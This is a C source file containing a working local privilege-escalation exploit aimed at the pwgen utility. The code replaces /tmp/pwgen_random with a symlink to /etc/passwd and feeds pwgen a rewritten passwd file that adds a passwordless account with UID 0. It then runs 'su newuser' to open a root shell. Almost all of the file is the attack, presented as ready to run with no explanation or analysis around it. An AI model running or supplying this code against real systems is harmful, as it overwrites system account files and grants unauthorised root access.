#include <stdio.h>
#include "stdlib.h"
#include <sys/wait.h>
#include <shadow.h>

#define FILENAME "/tmp/pwgen_random"

int main(int argc, char *argv[]) {
  pid_t pid;
  FILE *fd;

  char exploitStr[] = "\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nDebian-exim:x:102:102::/var/spool/exim4:/bin/false\nuser::1000:1000::/home/user:/bin/sh\nhalt::0:1001::/:/sbin/halt\nsshd:x:100:65534::/var/run/sshd:/usr/sbin/nologin\nnewuser::0:0:root:/root:/bin/bash\n";

  fd = popen("pwgen -e","w");

  remove(FILENAME);
  symlink("/etc/passwd", FILENAME);

  fprintf(fd, exploitStr);
  fclose(fd);
  
  system("su newuser");
  return 0;
}

